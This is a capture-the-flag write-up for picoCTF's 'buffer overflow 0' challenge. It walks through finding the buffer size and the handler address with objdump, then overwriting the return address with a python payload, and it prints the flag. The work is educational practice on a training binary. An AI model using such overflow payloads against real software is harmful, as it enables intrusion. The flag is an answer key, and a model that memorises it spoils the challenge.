> buffer overflow 0 - Points: 150 - (Solves: 834)
> Let's start off simple, can you overflow the right buffer in this program to get the flag? You can also find it in /problems/buffer-overflow-0_3_d5263c5219b334339c34ac35c51c4a17 on the shell server. Source.

The title already tells us we need to do a buffer overflow to exploit the program.

Since this is a buffer overflow we can start by looking at the buffer length so we have a base offset to work with.

From the source code we see that the buffer is of length 16.

By looking at the source we see that there is a function called `sigsegv_handler` which prints the flag.

We try to find the .text address of that function so we can use it in our buffer overflow.

```
% objdump -d vuln | grep sigsegv
0804862b <sigsegv_handler>:
```

In this case the text address is at `0804862b` which means if we're able to overwrite the return address with the sigsegv function's address the program will jump to that function and print the flag.

We need to enter the address in little endian format.

After playing incrementing the offset on every failed attempts, we find the correct offset to be 28 before the return address.

Hence our exploit:
```
% ./vuln "`python -c 'print "A"*28 + "\x2b\x86\x04\x08"'`"
picoCTF{ov3rfl0ws_ar3nt_that_bad_2d11f6cd}
```

Flag: `picoCTF{ov3rfl0ws_ar3nt_that_bad_2d11f6cd}`
